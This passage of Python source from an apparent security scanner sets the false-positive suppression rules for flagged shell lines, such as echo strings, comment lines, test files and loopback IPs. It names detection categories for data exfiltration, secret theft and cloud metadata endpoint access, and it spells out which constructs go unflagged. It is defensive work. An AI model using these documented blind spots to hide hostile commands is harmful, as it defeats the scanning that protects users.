    if rule_id == "CMD_INJECTION" and _cmdsub_is_safe_data_command(line_text, match):
        return "safe_literal"
    if rule_id == "CMD_INJECTION" and _pipe_to_text_processor(line_text, match):
        return "safe_literal"

    # r08 sangrokjung FP iter (2026-05-28) — Python embedded in a shell file.
    # (E) A bare Python raw-string literal line is a regex/pattern definition
    # (a security guard's own blocklist), not a shell command.
    if rule_id in _SHELL_EXECUTION_CLASS_RULES and _line_is_python_rawstring_pattern(line_text, match):
        return "safe_literal"
    # (F) ``subprocess.run(['git', ...])`` list-form runs argv directly with
    # no shell → no injection surface (``shell=True`` stays visible).
    if rule_id == "SHELL_EXEC" and _subprocess_call_is_list_form(lines, line_idx):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — Shell ``#`` comment line.
    # Execution-class rules (PRIVILEGE_ESC ``sudo``, FS_WRITE ``chmod NNN``,
    # CMD_INJECTION ``$(...)``) matched inside a full-line shell ``#``
    # comment are documentation prose, not invocation. Iron rule
    # preserved: prose-vector rules (PROMPT_INJECT / DATA_EXFIL / etc.)
    # stay visible via the existing demote pipeline.
    if _is_shell_comment_line(line_text) and rule_id in _SHELL_EXECUTION_CLASS_RULES:
        return "safe_literal"

    # r10-final FP iter (2026-05-28) — Execution-class rule matched
    # INSIDE a quoted string passed to ``echo``/``printf``/``cat``.
    # ``echo "Install with: sudo apt install $pkg"`` is display text,
    # not invocation. The display string is shown to the user; no
    # actual ``sudo`` runs.
    if rule_id in _SHELL_EXECUTION_CLASS_RULES and _match_inside_shell_echo_string(line_text, match):
        return "safe_literal"

    # r08 sangrokjung FP iter1 (2026-05-28) — FS_WRITE pattern bare-suffix
    # match (``.zshrc``, ``.bashrc``, ``.profile``) fires on READ checks
    # ``[ -f "$HOME/.zshrc" ]``, variable assignments ``shell_rc="$HOME/.zshrc"``,
    # and echo prose ``echo "No .zshrc found"`` — none are file writes.
    # Real writes need an explicit write-intent token (``>``, ``>>``,
    # ``tee``, ``cp`` …) within proximity.
    if rule_id == "FS_WRITE" and _shell_match_lacks_write_intent(line_text, match):
        return "safe_literal"

    # r10-final FP iter (2026-05-28) — OBFUSCATION pattern fires on
    # Nerd Font / Powerline icon byte sequences like
    # ``printf '\xee\x82\xb6'`` followed by ``# U+XXXX <icon-name>``
    # comment. These are statusline rendering primitives, not
    # obfuscation. The ``# U+`` codepoint comment is the unambiguous
    # disambiguator: legitimate icon definitions always carry it.
    if rule_id == "OBFUSCATION" and _is_nerd_font_icon_byte_sequence(lines, line_idx):
        return "safe_literal"

    # r10-final-blanket FP iter (2026-05-28) — blanket suppress
    # execution-class rules in shell TEST FILES (test-*.sh, *.test.sh,
    # in tests/ directory). Test scaffolding routinely uses curl, exec,
    # tmux, sleep, file writes, etc. for SUT setup. Iron rule preserved:
    # prose-vector rules (PROMPT_INJECT / DATA_EXFIL / INVISIBLE_UNICODE_RAW
    # / per-vendor SECRET_*) still fire.
    if _is_shell_test_file(file_path) and rule_id in _SHELL_TEST_BLANKET_SUPPRESS_RULES:
        return "safe_literal"

    # r10-final FP iter (2026-05-28) — NET_SUSPICIOUS / CMD_INJECTION
    # / SUPPLY_CHAIN / URL_RAW_IP on loopback / RFC1918 private IP
    # literals (127.0.0.1:9222 Chrome DevTools, 192.168.x.x home
    # network, etc.). Loopback / private IPs cannot reach the public
    # internet. Iron rule preserved: cloud metadata endpoint
    # 169.254.169.254 stays visible (attacker-reachable from cloud VMs).
    if rule_id in ("NET_SUSPICIOUS", "CMD_INJECTION", "SUPPLY_CHAIN", "URL_RAW_IP", "SSRF_PATTERN") and _line_has_loopback_or_private_ip_shell(line_text):
        return "safe_literal"

    if line_idx == 0:
        return ""
    # `_` underscores below used by intent — pylint-style noqa not needed.
    open_delimiters: list[str] = []
    for i in range(line_idx):
        line = lines[i]
        # If we're inside an open heredoc, ONLY check for the closer on
        # this line — non-closer lines inside a heredoc are body content,
        # never new openers (a heredoc body is data, not commands).
        if open_delimiters and line.strip() == open_delimiters[-1]:
            open_delimiters.pop()
            continue
        if open_delimiters:
            continue
        m = _PRINT_HEREDOC_OPEN_RE.match(line)
        if m:
            open_delimiters.append(m.group(2))
    return "safe_doc" if open_delimiters else ""
